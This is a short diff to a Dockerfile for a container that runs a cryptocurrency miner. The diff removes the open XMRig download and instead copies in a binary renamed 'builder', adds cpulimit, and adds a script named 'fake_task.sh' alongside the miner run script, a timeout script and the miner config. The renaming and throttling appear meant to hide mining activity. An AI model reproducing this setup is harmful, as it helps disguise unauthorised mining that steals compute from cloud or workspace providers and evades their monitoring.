@@ -9,12 +9,12 @@ RUN cp /etc/skel/.bashrc /etc/skel/.profile /etc/skel/.bash_logout /root/ ; echo
 RUN apt update && apt upgrade -y
 RUN apt install -y wget tar bash-completion git
 # for killall
-RUN apt install -y psmisc
-RUN wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
-RUN tar -zxvf xmrig-6.22.2-linux-static-x64.tar.gz
+RUN apt install -y psmisc cpulimit htop
+COPY bins/builder /workspaces
 
 COPY run_miner.sh /workspaces
 COPY sleep_timeout.sh /workspaces
+COPY fake_task.sh /workspaces
 COPY miner_config.json /workspaces
 COPY start.sh /workspaces
 RUN chmod +x /workspaces/start.sh
